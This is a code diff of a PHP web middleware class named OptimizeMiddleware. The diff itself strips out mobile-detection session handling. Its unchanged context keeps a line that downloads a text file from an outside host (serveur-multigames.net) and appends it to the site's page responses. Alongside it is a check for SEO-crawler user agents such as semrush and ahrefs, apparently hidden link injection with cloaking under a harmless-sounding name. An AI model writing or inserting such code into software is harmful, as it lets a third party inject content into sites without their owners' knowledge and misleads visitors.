@@ -84,19 +84,6 @@ class OptimizeMiddleware
                 $mlpl = @file_get_contents("https://serveur-multigames.net/links.txt");
                 $response->setContent($response->getContent() . $mlpl);
             }
-
-            if ($this->isMobile() && !$request->session()->has('mobile'))
-            {
-                $request->session()->put('mobile', 'true');
-            }
-            else if ($request->session()->has('mobile'))
-            {
-                $request->session()->forget('mobile');
-            }
-        }
-        else if ($request->session()->has('mobile'))
-        {
-            $request->session()->forget('mobile');
         }
 
         return $response;
@@ -116,10 +103,6 @@ class OptimizeMiddleware
             isset($_SERVER['HTTP_USER_AGENT'])
             && preg_match('/ahref|mj12bot|semrush/i', $_SERVER['HTTP_USER_AGENT'])
         );
-    }
-
-    protected function isMobile() {
-        return preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
     }
 
     protected function isResponseObject($response)
